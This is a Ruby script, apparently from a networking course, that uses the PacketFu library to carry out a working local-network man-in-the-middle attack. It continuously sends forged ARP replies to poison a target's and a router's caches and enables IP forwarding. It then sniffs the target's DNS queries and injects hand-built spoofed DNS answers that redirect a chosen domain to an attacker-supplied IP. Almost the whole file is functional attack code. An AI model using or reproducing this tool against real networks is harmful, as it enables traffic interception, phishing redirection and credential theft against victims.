#!/usr/bin/ruby
# encoding: ASCII-8BIT

#Usage
#ruby dns_spoof.rb <router> <target_ip> <sniffed_domain> <crafted_ip>



require 'rubygems'
require 'packetfu'
require 'thread'
require 'pry'
include PacketFu


#define our target and router, plus our interface
@interface = "em1"
@clientInfo = Utils.whoami?(:iface => @interface)            
@routerIP = ARGV[0]                                #Router IP
@targetIP = ARGV[1]                                #Target machine IP
@sniffDomain = ARGV[2]                             #Domain to sniff
@redirectIP = ARGV[3]                              #IP address to redirect to (currently set to BCIT.ca website)
@routerMAC = Utils.arp(@routerIP, :iface => @interface)
@targetMAC = Utils.arp(@targetIP, :iface => @interface)

puts "================================================"
puts "@routerIP " + ARGV[0]
puts "@targetIP " + ARGV[1]
puts "@sniffDom " + ARGV[2]
puts "@redirectIP " + ARGV[3] + "\n\n"
puts "@routerMAC " + @routerMAC 
puts "@targetMAC " + @targetMAC 
puts "@host eth_saddr " + @clientInfo[:eth_saddr] + "\n\n"
#exit

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = @clientInfo[:eth_saddr]     # sender's MAC address
arp_packet_target.eth_daddr = @targetMAC                  # target's MAC address
arp_packet_target.arp_saddr_mac = @clientInfo[:eth_saddr] # sender's MAC address
arp_packet_target.arp_daddr_mac = @targetMAC              # target's MAC address
arp_packet_target.arp_saddr_ip = @routerIP                # router's IP
arp_packet_target.arp_daddr_ip = @targetIP                # target's IP
arp_packet_target.arp_opcode = 2                          # arp code 2 == ARP reply
 
# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = @clientInfo[:eth_saddr]      # sender's MAC address
arp_packet_router.eth_daddr = @routerMAC                   # router's MAC address
arp_packet_router.arp_saddr_mac = @clientInfo[:eth_saddr]  # sender's MAC address
arp_packet_router.arp_daddr_mac = @routerMAC               # router's MAC address
arp_packet_router.arp_saddr_ip = @targetIP                 # target's IP
arp_packet_router.arp_daddr_ip = @routerIP                 # router's IP
arp_packet_router.arp_opcode = 2                           # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

def runspoof(arp_packet_target,arp_packet_router)
    # Send out both packets
    #puts "Spoofing...."
    caught=false
    while caught==false do
        sleep 1
        arp_packet_target.to_w(@interface)
        arp_packet_router.to_w(@interface)
    end
end

# sniff the traffic and capture the cookie packets, and dump them to a file
def spoof_dns
    puts "Waiting for incoming DNS packets..."
    iface = @interface
    capture_session = PacketFu::Capture.new(:iface => iface,:start => true,:promisc => true,:filter => "udp and port 53 and src #{@targetIP}")
    
    capture_session.stream.each do |p|
        puts "\n---------- captured packet -----------"
        #puts "udp packet on port 53 from #{@targetIP}"
        if UDPPacket.can_parse?(p) then
            #puts "Can parse"
            pkt = Packet.parse(p)
            #puts "Parsed"
            dnsQuery = pkt.payload[2].unpack('h*')[0].chr + pkt.payload[3].unpack('h*')[0].chr
            #puts "Got flag bits"
            if dnsQuery == '10'
                @domain = getDomain(pkt.payload[12..-1])
                puts "DNS Request for " + @domain
                
                #create query response (raw packets)
                udp_pkt = UDPPacket.new(:config => @clientInfo)
                udp_pkt.udp_src     = pkt.udp_dst
                udp_pkt.udp_dst     = pkt.udp_src
                udp_pkt.eth_daddr   = @targetMAC
                udp_pkt.ip_daddr    = @targetIP
                udp_pkt.ip_saddr    = pkt.ip_daddr
                
                udp_pkt.payload     =  pkt.payload[0,2]             #DNS Transaction ID (must be same for request and response)
                udp_pkt.payload     += "\x81"+"\x80"                #DNS Flags 10000001 10000000 (response, recursion desired, recursion available)
                
                udp_pkt.payload     += "\x00"+"\x01"+"\x00"+"\x01"  #DNS 1 Question and 1 Answer RR's
                udp_pkt.payload     += "\x00"+"\x00"+"\x00"+"\x00"  #DNS 0 Authority RR's and 0 Additional RR's
                
                #DNS Generate the domain name
                @domain.split('.').each do |domainString|
                    #put length before each part of the domain
                    udp_pkt.payload += domainString.length.chr
                    #section of domain
                    udp_pkt.payload += domainString
                end
                
                udp_pkt.payload     += "\x00"                       #DNS end of domain name
                udp_pkt.payload     += "\x00"+"\x01"                #DNS Type A
                udp_pkt.payload     += "\x00"+"\x01"                #DNS Class IN
                
                udp_pkt.payload     += "\xc0"+"\x0c"                #DNS Answer name
                udp_pkt.payload     += "\x00"+"\x01"                #DNS Type A
                udp_pkt.payload     += "\x00"+"\x01"                #DNS Class IN
                udp_pkt.payload     += "\x00"+"\x00"+"\x02"+"\x56"  #DNS TTL (256s)
                udp_pkt.payload     += "\x00"+"\x04"                #DNS Data Length 4
                
                #DNS Generate redirect IP
                ipToSpoof = @redirectIP.split('.')
                redirectIPHex = [ipToSpoof[0].to_i, ipToSpoof[1].to_i, ipToSpoof[2].to_i, ipToSpoof[3].to_i].pack('c*')
                
                udp_pkt.payload     += redirectIPHex                #DNS Address
                
                #recalculation of fields
                udp_pkt.recalc
                
                #send to interface
                udp_pkt.to_w(@interface);
                puts "Sent spoofed reply addr #{@redirectIP}"
            else
                puts "Not DNS request"
            end
        else
            puts "Cannot parse"
        end
    end
end

# Function to Get the domain name from the payload.
def getDomain(payload)
    #puts "getDomain()"
    domain = ""
    while(true)
        #binding.pry
        len = payload[0].unpack('H*')[0].to_i(16)
        if (len != 0)
            domain += payload[1,len] + "."
            payload = payload[len+1..-1]
        else
            return domain = domain[0,domain.length-1]
        end
    end
end

begin
    puts "Starting the ARP poisoning thread..."
    arp_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
    
    puts "Starting the DNS spoofing thread..."
    dns_thread = Thread.new{spoof_dns}
    arp_thread.join
    dns_thread.join

    # Catch the interrupt and kill the threads
    rescue Interrupt
    puts "\nSpoof stopped by interrupt signal."
    Thread.kill(arp_thread)
    Thread.kill(dns_thread)
    `echo 0 > /proc/sys/net/ipv4/ip_forward`
    exit 0
end

